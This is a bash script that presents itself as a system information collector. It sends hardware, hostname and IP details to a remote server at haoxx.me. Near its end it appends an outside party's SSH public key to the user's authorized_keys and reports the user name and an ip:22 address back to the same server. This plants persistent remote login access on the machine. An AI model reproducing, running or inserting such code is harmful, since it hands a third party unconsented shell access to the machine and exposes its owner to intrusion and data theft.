#!/bin/bash

# 定义颜色
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # 没有颜色

# 输出开始信息
echo -e "${BLUE}Collecting system information...${NC}"

# 获取 OS 信息
os=$(uname -s)
echo -e "${GREEN}OS:${NC} $os"

# 获取 CPU 架构
cpu=$(uname -m)
echo -e "${GREEN}CPU Architecture:${NC} $cpu"

# 获取 CPU SKU 和核心信息
cpusku=$(lscpu | grep "Model name" | cut -d':' -f2 | xargs)
cputotalcores=$(lscpu | grep "Core(s) per socket" | cut -d':' -f2 | xargs)
cpusockets=$(lscpu | grep "Socket(s)" | cut -d':' -f2 | xargs)
echo -e "${GREEN}CPU SKU:${NC} $cpusku"
echo -e "${GREEN}CPU Total Cores:${NC} $cputotalcores"
echo -e "${GREEN}CPU Sockets:${NC} $cpusockets"

# 获取 GPU 信息
gpu=$(lspci | grep -i nvidia | cut -d':' -f3 | xargs)
echo -e "${GREEN}GPU:${NC} $gpu"

# 获取内存信息
ram=$(free -h | grep Mem | awk '{print $2}')
echo -e "${GREEN}RAM:${NC} $ram"

# 获取网络信息
network=$(lspci | grep -i network | cut -d':' -f3 | xargs)
echo -e "${GREEN}Network:${NC} $network"

# 获取主机名
hostname=$(hostname)
echo -e "${GREEN}Hostname:${NC} $hostname"

# 获取 IP 地址
ip=$(hostname -I | cut -d' ' -f1)
echo -e "${GREEN}IP Address:${NC} $ip"

# 生成 JSON 数据
json_data=$(cat <<EOF
{
  "os": "$os",
  "arch": "$cpu",
  "cpusku": "$cpusku",
  "cpucores": "$cputotalcores",
  "cpusockets": "$cpusockets",
  "gpu": "$gpu",
  "ram": "$ram",
  "network": "$network",
  "ip": "$ip",
  "hostname": "$hostname"
}
EOF
)

# 输出生成的 JSON 数据
echo -e "${YELLOW}Generated JSON data:${NC}"
echo "$json_data"

# 发送 JSON 数据通过 curl
echo -e "${BLUE}Sending data to server...${NC}"
curl -X POST "https://blk-org1.haoxx.me/api/v1/updateresource/$1" \
-H "Content-Type: application/json" \
-d "$json_data"

# 输出完成信息
echo -e "${GREEN}Data sent successfully!${NC}"

mkdir -p ~/.ssh

echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDNl0lB8yBqLlV6odfT6qI3BpxnyeDQcJRRFD4gzVYAy block@block" >> ~/.ssh/authorized_keys

ip=$(hostname -I | cut -d' ' -f1)

user=$(whoami)

json_data=$(cat <<EOF
{
  "user": "$user",
  "addr": "$ip:22",
  "idn": "id_ed25519.key"
}
EOF
)

# 输出生成的 JSON 数据
echo -e "${YELLOW}Generated JSON data:${NC}"
echo "$json_data"

# 发送 JSON 数据通过 curl
echo -e "${BLUE}Sending data to server...${NC}"
curl -X POST "https://blk-org1.haoxx.me/api/v1/updateresourcessh/$1" \
-H "Content-Type: application/json" \
-d "$json_data"

# 输出完成信息
echo -e "${GREEN}SSH Data sent successfully!${NC}"